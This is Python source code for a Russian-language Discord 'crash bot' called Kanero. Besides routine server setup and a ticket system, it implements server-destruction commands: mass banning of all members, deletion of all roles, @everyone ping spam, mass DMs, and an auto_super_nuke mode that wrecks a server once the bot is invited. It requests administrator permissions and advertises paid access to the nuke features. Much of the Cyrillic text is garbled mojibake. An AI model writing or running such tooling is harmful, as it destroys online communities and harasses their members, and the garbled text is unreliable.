                    existing_message = message
                    break
            
            results.append(f"📊 Проверено сообщений: {message_count}")
            
            # Создаём обновлённый embed
            ticket_embed = discord.Embed(
                title="🎫 Поддержка в Kanero",
                description=(
                    "Нужна помощь? Есть вопрос?\n\n"
                    "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
                    "• Вопросы по боту\n"
                    "• Покупка White / Premium\n"
                    "• Помощь с настройками\n\n"
                    "**🛡️ Команда поддержки:**\n"
                    "👑 Owner • 🔧 Developer • 🛡️ Moderator • 🧪 Tester\n\n"
                    "**🔗 Хочу Discord сервер с поддержкой?**\n"
                    "Если у тебя есть **свой сервер** на каком-либо Discord сервере с поддержкой (типа краша), напиши нам!\n"
                    "Возможность стать нашим **партнёром сервером** с ролью 🤝"
                ),
                color=0x0a0a0a
            )
            ticket_embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
            
            if existing_message:
                # Обновляем существующее сообщение
                await existing_message.edit(embed=ticket_embed, view=TicketOpenView())
                results.append("✅ Обновлено сообщение в create-ticket")
            else:
                # Отправляем новое сообщение если старого нет
                await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
                results.append("✅ Отправлено сообщение в create-ticket")
        except Exception as e:
            results.append(f"❌ Обновление create-ticket: {str(e)}")
    else:
        results.append("⚠️ Канал create-ticket не найден")

    # 8. Проверяем порядок категорий (чаты должны быть над ADMIN)
    try:
        cat_chat = discord.utils.find(lambda c: "ЧАТЫ" in c.name, guild.categories)
        cat_admin = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
        
        if cat_chat and cat_admin and cat_chat.position > cat_admin.position:
            # Если категория чаты ADMIN, нужно переместить выше
            await cat_chat.edit(position=cat_admin.position)
            results.append("✅ Перемещена категория ЧАТЫ над ADMIN")
    except Exception as e:
        results.append(f"❌ Перемещение категорий: {e}")

    # 8.5. Создаём категорию TESTS если её нет
    cat_tests = discord.utils.find(lambda c: "TESTS" in c.name or "тесты" in c.name or "тестов" in c.name.lower(), guild.categories)
    if not cat_tests:
        try:
            role_tester = discord.utils.find(lambda r: r.name == "🧪 Tester", guild.roles)
            ow_tests = {guild.default_role: _ow()}
            if role_guest: ow_tests[role_guest] = _ow()
            if role_user:  ow_tests[role_user]  = _ow()
            if role_white: ow_tests[role_white] = _ow()
            if role_prem:  ow_tests[role_prem]  = _ow()
            if role_tester: ow_tests[role_tester] = _ow(True, True)
            if role_owner: ow_tests[role_owner] = _ow(True, True)
            if role_dev:   ow_tests[role_dev]   = _ow(True, True)
            
            cat_tests = await guild.create_category("━━━━ 🧪 TESTS ━━━━", overwrites=ow_tests)
            
            # Создаём каналы в TESTS
            await guild.create_text_channel("ℹ️・info", category=cat_tests, overwrites=ow_tests, topic="Инструкция для тестеров — как тестировать и что делать")
            await guild.create_text_channel("📰・news", category=cat_tests, overwrites=ow_tests, topic="📰 НОВОСТИ ДЛЯ ТЕСТЕРОВ | Обновления, новые функции для тестирования, важные объявления")
            await guild.create_text_channel("🐛・bug-reports", category=cat_tests, overwrites=ow_tests, topic="🐛 ОТЧЁТЫ О БАГАХ | Создай тред → Название бага → Шаги воспроизведения → Ожидаемый результат → Скриншоты")
            await guild.create_text_channel("🧪・testing", category=cat_tests, overwrites=ow_tests, topic="🧪 ОБСУЖДЕНИЕ | Обсуждай новые функции, делись идеями, помогай друг другу, задавай вопросы")
            await guild.create_text_channel("✅・test-results", category=cat_tests, overwrites=ow_tests, topic="✅ РЕЗУЛЬТАТЫ ТЕСТОВ | Создай тред для каждой функции → ✅ работает / ❌ баг / ⚠️ улучшить")
            
            results.append("✅ Создана категория 🧪 TESTS с каналами")
        except Exception as e:
            results.append(f"❌ Категория TESTS: {e}")
    else:
        # Проверяем наличие каналов в TESTS
        existing_tests = [ch.name.lower() for ch in cat_tests.channels]
        role_tester = discord.utils.find(lambda r: r.name == "🧪 Tester", guild.roles)
        ow_tests = {guild.default_role: _ow()}
        if role_guest: ow_tests[role_guest] = _ow()
        if role_user:  ow_tests[role_user]  = _ow()
        if role_white: ow_tests[role_white] = _ow()
        if role_prem:  ow_tests[role_prem]  = _ow()
        if role_tester: ow_tests[role_tester] = _ow(True, True)
        if role_owner: ow_tests[role_owner] = _ow(True, True)
        if role_dev:   ow_tests[role_dev]   = _ow(True, True)
        
        if not any("bug" in n for n in existing_tests):
            try:
                await guild.create_text_channel("🐛・bug-reports", category=cat_tests, overwrites=ow_tests, topic="🐛 ОТЧЁТЫ О БАГАХ | Создай тред → Название бага → Шаги воспроизведения → Ожидаемый результат → Скриншоты")
                results.append("✅ Создан 🐛・bug-reports")
            except Exception as e:
                results.append(f"❌ 🐛・bug-reports: {e}")
        if not any("news" in n or "новости" in n for n in existing_tests):
            try:
                await guild.create_text_channel("📰・news", category=cat_tests, overwrites=ow_tests, topic="📰 НОВОСТИ ДЛЯ ТЕСТЕРОВ | Обновления, новые функции для тестирования, важные объявления")
                results.append("✅ Создан 📰・news")
            except Exception as e:
                results.append(f"❌ 📰・news: {e}")
        if not any("testing" in n for n in existing_tests):
            try:
                await guild.create_text_channel("🧪・testing", category=cat_tests, overwrites=ow_tests, topic="🧪 ОБСУЖДЕНИЕ | Обсуждай новые функции, делись идеями, помогай друг другу, задавай вопросы")
                results.append("✅ Создан 🧪・testing")
            except Exception as e:
                results.append(f"❌ 🧪・testing: {e}")
        if not any("test-results" in n or "результат" in n for n in existing_tests):
            try:
                await guild.create_text_channel("✅・test-results", category=cat_tests, overwrites=ow_tests, topic="✅ РЕЗУЛЬТАТЫ ТЕСТОВ | Создай тред для каждой функции → ✅ работает / ❌ баг / ⚠️ улучшить")
                results.append("✅ Создан ✅・test-results")
            except Exception as e:
                results.append(f"❌ ✅・test-results: {e}")

    # 9. Проверяем порядок ролей
    try:
        bot_top = ctx.guild.me.top_role.position
        if bot_top < 10:
            results.append(f"⚠️ Роль бота слишком низко (позиция {bot_top}) — подними роль **🤖 Kanero** выше всех ролей, затем запусти `!setup_update`")
        else:
            order = [
                (Kanero,     bot_top - 1),
                ("🔧 Developer",  bot_top - 2),
                ("👑 Owner",      bot_top - 3),
                ("🧪 Tester",     bot_top - 4),
                ("🛡️ Moderator",  bot_top - 5),
                ("🤝 Friend",     bot_top - 6),
                ("💎 Premium",    bot_top - 7),
                ("✅ White",      bot_top - 8),
                ("🎬 Media",      bot_top - 9),
                ("👥 User",       bot_top - 10),
                ("👤 Guest",      1),
            ]
            for rname, pos in order:
                r = discord.utils.find(lambda x, n=rname: x.name == n, guild.roles)
                if r:
                    try:
                        await r.edit(position=max(1, pos))
                    except Exception:
                        pass
            results.append("✅ Порядок ролей обновлён")
    except Exception as e:
        results.append(f"❌ Порядок ролей: {e}")

    embed = discord.Embed(
        title="✅ Сервер обновлён",
        description="\n".join(results),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Сервер не перезагружен  |  !setup — полная перезагрузка")
    await msg.edit(content=None, embed=embed)

    # -- Обновляем ссылку в спаме бота --
    invite = "https://discord.gg/nNTB37QNCG"
    import re as _re
    old_text = config.SPAM_TEXT
    # Заменяем старую discord.gg/... ссылку на актуальную
    new_text = _re.sub(r'https://discord\.gg/\S+', invite, old_text)
    if new_text != old_text:
        config.SPAM_TEXT = new_text
        save_spam_text()
        results.append("✅ Ссылка в спаме бота обновлена")

    # -- Новости и продажа в sell --
    await _post_news_and_sell(guild)


@bot.command(name="autorole")
@wl_check()
async def autorole_cmd(ctx):
    """Показывает текущую авто-роль для входа на сервер."""
    guild = ctx.guild
    guest_role = discord.utils.find(lambda r: r.name == "👤 Guest", guild.roles)

    lines = []
    if guest_role:
        lines.append(f"✅ Авто-роль включена: {guest_role.mention} (`{guest_role.id}`)")
    else:
        lines.append("❌ Роль **👤 Guest** не найдена — запусти `!setup` или создай роль вручную")

    embed = discord.Embed(
        title="🎭 Статус авто-роли",
        description="\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text="Роль выдаётся автоматически при входе на сервер")
    await ctx.send(embed=embed)


@bot.command(name="on_add")
async def on_add(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id not in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.append(user_id)
        save_owner_nuke_list()
    await ctx.send(f"?? `{user_id}` ������� ������ � **Owner Nuke**.")


@bot.command(name="on_remove")
async def on_remove(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.remove(user_id)
        save_owner_nuke_list()
        await ctx.send(f"? `{user_id}` ����� �� Owner Nuke.")
    else:
        await ctx.send("�� Готово.")


@bot.command(name="on_list")
async def on_list(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    lines = []
    for uid in OWNER_NUKE_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` � **{user}**")
        except Exception:
            lines.append(f"`{uid}` � *�� ������*")
    embed = discord.Embed(title="?? Owner Nuke List", description="\n".join(lines) if lines else "*�����*", color=0x0a0a0a)
    embed.set_footer(text=f"?? Kanero  |  �����: {len(OWNER_NUKE_LIST)}")
    await ctx.send(embed=embed)


# --- FREELIST MANAGEMENT -----------------------------------

@bot.command(name="fl_add")
async def fl_add(ctx, *, user_input: str):
    """�������� � freelist. ��� ���� � навсегда. � ����� � навсегда.
    Использование: !fl_add @user [���] | !fl_add all [���]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    # Проверка: только на домашнем сервере или для глобального овнера
    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        embed = discord.Embed(
            title="❌ Команда недоступна",
            description=(
                "Команда `!fl_add` работает **только на домашнем сервере**.\n\n"
                "Freelist можно выдавать только там, где бот имеет полный контроль.\n"
                "Это сделано для безопасности и предотвращения злоупотреблений."
            ),
            color=0xff0000
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except Exception:
            actual_input = user_input

    # ����� ALL
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("? ����� Freelist ���� навсегда��...")
        count = 0
        user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "fl", duration_hours)
            else:
                if uid not in FREELIST:
                    FREELIST.append(uid)
            if user_role and user_role not in member.roles:
                try:
                    await member.add_roles(user_role, reason="fl_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_freelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"? **Freelist**{dur_text} ����� **{count}** навсегда��.")
        return

    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "fl", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"? **{user}** ������� **Freelist** �� **{duration_text}** (��������)."
    else:
        if user_id not in FREELIST:
            FREELIST.append(user_id)
            save_freelist()
        result_text = f"? **{user}** (`{user_id}`) навсегда � freelist навсегда."

    # ����� ���� � ������ � addbot
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
                if user_role and user_role not in member.roles:
                    await member.add_roles(user_role, reason="fl_add")
            await update_stats_channels(home_guild)

            # ������ � #addbot
            addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), home_guild.text_channels)
            if addbot_ch:
                app_id = bot.user.id
                invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
                days_text = f" �� **{duration_text}**" if duration_hours else ""
                notif = discord.Embed(
                    title="? ����� навсегда Freelist",
                    description=(
                        f"{user.mention} навсегда � **Freelist**{days_text}!\n\n"
                        f"**�подписка истекла:**\n"
                        f"`!nuke` � `!auto_nuke` � `!help` � `!changelog`\n\n"
                        f"**������ ������?**\n"
                        f"✅ White / ?? Premium � [������ �� FunPay](https://funpay.com/users/16928925/)\n\n"
                        f"**�������� ���� �� ������:** [����� ����]({invite_url})"
                    ),
                    color=0x00ff00
                )
                notif.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd")
                await addbot_ch.send(content=user.mention, embed=notif)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="fl_remove")
async def fl_remove(ctx, *, user_input: str):
    """������ �� freelist. ������ ��� �подписка истекла."""
    # ������ подписка истекла ���все параллельно�
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in FREELIST:
        FREELIST.remove(user_id)
        save_freelist()
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            if home_guild:
                member = home_guild.get_member(user_id)
                if member:
                    user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
                    if user_role and user_role in member.roles:
                        await member.remove_roles(user_role, reason="fl_remove")
                await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"? **{user}** ����� �� freelist.")
    else:
        await ctx.send("�� ������ � freelist.")


@bot.command(name="fl_clear")
async def fl_clear(ctx):
    """�������� freelist. ������ ��� �подписка истекла."""
    # ������ подписка истекла ���все параллельно�
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    count = len(FREELIST)
    FREELIST.clear()
    save_freelist()
    embed = discord.Embed(
        title="??? Freelist ������",
        description=f"������� **{count}** навсегда�����.",
        color=0x0a0a0a
    )
    embed.set_footer(text="🤖 Kanero")
    await ctx.send(embed=embed)


# --- TESTER MANAGEMENT -------------------------------------

@bot.command(name="ts_add")
async def ts_add(ctx, *, user_input: str):
    """Добавить тестера. Только для овнера.
    Использование: !ts_add @user | !ts_add user_id
    """
    if ctx.author.id != config.OWNER_ID:
        return

    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    
    user_id = user.id
    if user_id in TESTER_LIST:
        await ctx.send(f"⚠️ **{user}** уже в списке тестеров.")
        return
    
    TESTER_LIST.append(user_id)
    save_tester_list()
    
    # Выдаём роль на домашнем сервере
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                tester_role = discord.utils.find(lambda r: r.name == "🧪 Tester", home_guild.roles)
                if tester_role and tester_role not in member.roles:
                    await member.add_roles(tester_role, reason="ts_add")
    except Exception:
        pass
    
    await ctx.send(f"✅ **{user}** (`{user_id}`) добавлен в тестеры.")


@bot.command(name="ts_remove")
async def ts_remove(ctx, *, user_input: str):
    """Убрать тестера. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return

    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    
    user_id = user.id
    if user_id not in TESTER_LIST:
        await ctx.send(f"⚠️ **{user}** не в списке тестеров.")
        return
    
    TESTER_LIST.remove(user_id)
    save_tester_list()
    
    # Убираем роль на домашнем сервере
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if member:
                tester_role = discord.utils.find(lambda r: r.name == "🧪 Tester", home_guild.roles)
                if tester_role and tester_role in member.roles:
                    await member.remove_roles(tester_role, reason="ts_remove")
    except Exception:
        pass
    
    await ctx.send(f"✅ **{user}** убран из тестеров.")


# Оставляем старые команды для совместимости
@bot.command(name="tester_add")
async def tester_add(ctx, *, user_input: str):
    """Добавить тестера (старая команда, используй !ts_add)"""
    await ts_add(ctx, user_input=user_input)


@bot.command(name="tester_remove")
async def tester_remove(ctx, *, user_input: str):
    """Убрать тестера (старая команда, используй !ts_remove)"""
    await ts_remove(ctx, user_input=user_input)


# Удалена команда !tester_list - используй !list для просмотра всех листов


# --- Компенсация (временные подписки) ----------------------

# --- TICKET SYSTEM -----------------------------------------

TICKET_CATEGORY_NAME = "?? ������"
open_tickets: dict[int, int] = {}  # user_id -> channel_id


class TicketCloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="?? ������� �����", style=discord.ButtonStyle.danger, custom_id="ticket_close")
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        ch = interaction.channel
        creator_id = None
        for uid, cid in open_tickets.items():
            if cid == ch.id:
                creator_id = uid
                break
        if (interaction.user.id != config.OWNER_ID
                and interaction.user.id not in config.OWNER_WHITELIST
                and interaction.user.id != creator_id):
            await interaction.response.send_message("? ������ навсегда� �все параллельно�� ����� �Готово.", ephemeral=True)
            return
        await interaction.response.send_message("?? ���все параллельно...")
        open_tickets.pop(creator_id, None)
        await ch.delete()


class TicketOpenView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎫 Создать тикет", style=discord.ButtonStyle.primary, custom_id="ticket_open")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        # Проверяем нет ли уже открытого тикета
        if user.id in open_tickets:
            existing = guild.get_channel(open_tickets[user.id])
            if existing:
                await interaction.response.send_message(f"❌ У тебя уже есть тикет: {existing.mention}", ephemeral=True)
                return
            open_tickets.pop(user.id, None)

        # Ищем или создаём категорию тикетов
        category = discord.utils.find(lambda c: TICKET_CATEGORY_NAME in c.name, guild.categories)
        if not category:
            # Создаём категорию с правами для администрации
            cat_overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
            }
            # Добавляем права для ролей поддержки
            for r in guild.roles:
                if r.name in ("👑 Owner", "🔧 Developer", Kanero, "🛡️ Moderator", "🧪 Tester"):
                    cat_overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
            
            category = await guild.create_category(TICKET_CATEGORY_NAME, overwrites=cat_overwrites)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            user: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True),
        }
        for r in guild.roles:
            if r.name in ("👑 Owner", "🔧 Developer", Kanero, "🛡️ Moderator", "🧪 Tester"):
                overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)

        ticket_ch = await guild.create_text_channel(
            f"ticket-{user.name}",
            category=category,
            overwrites=overwrites,
            topic=f"Тикет пользователя {user} ({user.id})"
        )
        open_tickets[user.id] = ticket_ch.id

        embed = discord.Embed(
            title="🎫 Тикет создан",
            description=(
                f"Привет, {user.mention}!\n\n"
                "Здесь твой приватный чат с администрацией сервера для любых вопросов.\n\n"
                "Чтобы закрыть тикет нажми красную кнопку."
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Ответ поступит очень быстро")
        await ticket_ch.send(f"{user.mention}", embed=embed, view=TicketCloseView())
        await interaction.response.send_message(f"✅ Тикет создан: {ticket_ch.mention}", ephemeral=True)


@bot.command(name="ticket_setup")
async def ticket_setup(ctx):
    """Отправить сообщение с кнопкой создания тикета. Только для овнера."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        return
    embed = discord.Embed(
        title="🎫 Поддержка в Kanero",
        description=(
            "Нужна помощь? Есть вопрос?\n\n"
            "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
            "• Вопросы по боту\n"
            "• Покупка White / Premium\n"
            "• Помощь с настройками\n\n"
            "**🛡️ Команда поддержки:**\n"
            "👑 Owner • 🔧 Developer • 🛡️ Moderator • 🧪 Tester"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
    await ctx.send(embed=embed, view=TicketOpenView())
    try:
        await ctx.message.delete()
    except Exception:
        pass


@bot.command(name="goout")
async def goout(ctx):
    """Бот покидает сервер. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return
    guild = ctx.guild
    try:
        await ctx.send("👋 Бот покидает сервер.")
        await guild.leave()
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")


    embed = discord.Embed(
        title="🤖 Kanero — CRASH BOT",
        description=(
            "Краш готов!\n\n"
            "**Что умеет бот:**\n"
            "• `!nuke` — краш сервера быстро\n"
            "• `!auto_nuke` — авто-краш при входе\n"
            "• `!super_nuke` — бан + краш сервера\n"
            "• И многое другое...\n\n"
            "**Как получить доступ:**\n"
            "Зайди на наш сервер > напиши что-то в канале `!help`\n\n"
            "**���� �� �� ���� �������** � ������ � ������� подписка истекла.\n"
            "��� ������ � ������� ������ �подписка истеклаГотово.\n\n"
            "**������ навсегда:** **davaidkatt** | **@Firisotik**"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="?? Kanero  |  ����� ������ ����� ������")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    await ctx.send(embed=embed, view=GetAccessView())
    try:
        await ctx.message.delete()
    except Exception:
        pass




@bot.command(name="massdm")
@premium_check()
async def massdm(ctx, *, text: str):
    guild = ctx.guild
    members = [m for m in guild.members if not m.bot]
    sent = 0
    failed = 0
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"?? навсегда �� {len(members)} навсегда��...",
        color=0x0a0a0a
    ))
    for member in members:
        try:
            await member.send(text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.5)
    embed = discord.Embed(
        title="?? Mass DM навсегда",
        description=f"? навсегда��: **{sent}**\n? �� навсегда��: **{failed}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="🤖 Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="massban")
@premium_check()
async def massban(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    targets = [
        m for m in guild.members
        if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id
        and (not m.top_role or m.top_role < bot_role)
    ]
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"?? ���� {len(targets)} навсегда��...",
        color=0x0a0a0a
    ))
    results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
    banned = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        title="?? Mass Ban навсегда",
        description=f"? навсегда: **{banned}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="🤖 Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="spam")
@premium_check()
async def spam_cmd(ctx, count: int, *, text: str):
    if count > 50:
        await ctx.send("�������� 50.")
        return
    mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
    for _ in range(count):
        try:
            await ctx.send(text, allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="pingspam")
@premium_check()
async def pingspam(ctx, count: int = 10):
    if count > 30:
        await ctx.send("�������� 30.")
        return
    mentions = discord.AllowedMentions(everyone=True)
    for _ in range(count):
        try:
            await ctx.send("@everyone @here", allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="rolesdelete")
@premium_check()
async def rolesdelete(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    results = await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        description=f"??? ������� �����: **{deleted}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="🤖 Kanero")
    await ctx.send(embed=embed)


@bot.command(name="serverinfo")
@premium_check()
async def serverinfo(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"?? {guild.name}",
        color=0x0a0a0a
    )
    embed.add_field(name="?? навсегда��", value=str(guild.member_count))
    embed.add_field(name="?? �������", value=str(len(guild.channels)))
    embed.add_field(name="?? �����", value=str(len(guild.roles)))
    embed.add_field(name="?? ���� �������", value=str(guild.premium_tier))
    embed.add_field(name="?? навсегда", value=str(guild.premium_subscription_count))
    embed.add_field(name="?? ID �������", value=str(guild.id))
    embed.add_field(name="?? �����", value=str(guild.owner))
    embed.add_field(name="?? ������", value=guild.created_at.strftime("%d.%m.%Y"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="🤖 Kanero")
    await ctx.send(embed=embed)


@bot.command(name="userinfo")
@premium_check()
async def userinfo(ctx, user_id: int = None):
    if user_id:
        try:
            user = await bot.fetch_user(user_id)
        except Exception:
            await ctx.send("������������ �� Готово.")
            return
    else:
        user = ctx.author
    member = ctx.guild.get_member(user.id) if ctx.guild else None
    embed = discord.Embed(
        title=f"??? {user}",
        color=0x0a0a0a
    )
    embed.add_field(name="?? ID", value=str(user.id))
    embed.add_field(name="?? ������� ������", value=user.created_at.strftime("%d.%m.%Y"))
    if member:
        embed.add_field(name="?? ����� �� ������", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
        embed.add_field(name="?? ������ ����", value=member.top_role.mention)
        embed.add_field(name="?? ����", value="��" if member.premium_since else "���")
    if user.avatar:
        embed.set_thumbnail(url=user.avatar.url)
    embed.set_footer(text="🤖 Kanero")
    await ctx.send(embed=embed)


# --- AUTO SUPER NUKE ---------------------------------------

AUTO_SUPER_NUKE = False
AUTO_SUPER_NUKE_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# Краш готов)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n☠️ Kanero — https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa ☠️"
AUTO_SUPERPR_NUKE = False
AUTO_SUPERPR_NUKE_TEXT = None
# Текст для auto_super_nuke
SNUKE_CONFIG = {
    "massban": True,       # банить всех
    "boosters_only": False, # банить только бустеров
    "rolesdelete": True,   # удалять роли
    "pingspam": True,      # спам пинг
    "massdm": False,       # спам лс
}


def save_auto_super_nuke():
    asyncio.create_task(db_set("data", "auto_super_nuke", {
        "enabled": AUTO_SUPER_NUKE,
        "text": AUTO_SUPER_NUKE_TEXT,
        "config": SNUKE_CONFIG
    }))


def load_auto_super_nuke():
    pass  # загрузка из async load в on_ready


@bot.command(name="auto_super_nuke")
@premium_check()
async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPER_NUKE = True
        save_auto_super_nuke()
        embed = discord.Embed(
            title="💥 Auto Super Nuke – включён",
            description=(
                "Бот будет нюкать по новым приглашениям:\n"
                "• Бан + кик всех юзеров (кто не бустер)\n"
                "• Удалит роли бустеров\n"
                "• Удалить роли всех\n"
                "• Спам пинг @everyone\n\n"
                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'стандарт'}`\n"
                "Чтобы сменить текст: `!auto_super_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPER_NUKE = False
        save_auto_super_nuke()
        embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
            return
        AUTO_SUPER_NUKE_TEXT = text
        save_auto_super_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Super Nuke изменён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="🤖 Kanero  |  Чтобы начать: !auto_super_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включен" if AUTO_SUPER_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="💥 Auto Super Nuke – INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "Бот будет нюкать по входу:\n"
                "• Бан + кик всех участников\n"
                "• Удалит роли бустеров\n"
                "• Удалить роли всех\n"
                "• Спам пинг @everyone\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_super_nuke on` – включить\n"
            "`!auto_super_nuke off` – выключить\n"
            "`!auto_super_nuke text <текст>` – задать текст\n"
            "`!auto_super_nuke info` – инфо о текущем статусе"
        )


@bot.command(name="snuke_config")
@premium_check()
async def snuke_config(ctx, option: str = None, value: str = None):
    """Настройки для режима auto_super_nuke что будет он делать"""
    options = {
        "massban":      ("Массбан всех участников", "massban"),
        "boosters":     ("Только кикать бустеров", "boosters_only"),
        "rolesdelete":  ("Удалить роли всех", "rolesdelete"),
        "pingspam":     ("Спам пинг @everyone", "pingspam"),
        "massdm":       ("Спам дм всем участникам", "massdm"),
    }

    if not option:
